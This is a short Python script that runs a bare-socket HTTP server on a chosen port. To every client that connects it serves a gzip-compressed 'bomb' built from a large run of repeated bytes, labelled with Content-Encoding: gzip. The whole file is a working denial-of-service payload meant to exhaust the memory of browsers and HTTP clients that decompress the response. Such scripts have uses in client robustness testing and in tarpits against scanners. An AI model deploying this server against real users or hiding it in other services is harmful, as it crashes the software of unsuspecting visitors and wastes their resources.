#!/usr/bin/python3
import socket
import gzip
#import zlib
from sys import argv


port = argv[1]
size = int(argv[2])

bomb = gzip.compress(b"A"*size, compresslevel=9)
#bomb = zlib.compress(b"A"*size, level=9)
print("[*] powered %d -> %d bytes" % (len(bomb), size))
WWW = b'''HTTP/1.1 200
Content-Encoding: gzip
Content-Length: %d

%s
''' % (len(bomb), bomb)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(("0.0.0.0", int(port)))
s.listen(10)
while True:
	c,info = s.accept()
	try:
		print(c.recv(1024).decode(errors="ignore"))
		c.send(WWW)
	except Exception as e:
		print(str(e))
	c.close()
